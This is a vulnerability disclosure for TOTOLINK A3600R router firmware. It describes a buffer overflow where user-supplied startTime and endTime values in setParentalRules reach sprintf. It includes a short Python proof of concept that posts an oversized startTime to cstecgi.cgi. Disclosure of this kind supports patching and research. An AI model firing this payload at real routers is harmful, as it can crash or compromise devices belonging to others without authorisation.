## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=63&ids=36

## Affected version

A3600R V4.1.2cu.5182_B20201102

## Vulnerability details

In the A3600R V4.1.2cu.5182_B20201102 firmware has a buffer overflow vulnerability in the `setParentalRules` function. The `v12, v13` variable receives the `startTime, endTime` parameter from a POST request. However, since the user can control the input of `startTime, endTime`, the `sprintf` can cause a buffer overflow vulnerability.

![image-20240721012935204](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721012935204.png)

![image-20240721012839043](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721012839043.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {
"topicurl":"setParentalRules",
"addEffect":"0",
"startTime":"b"*0x1000,
}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721012919451](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721012919451.png)
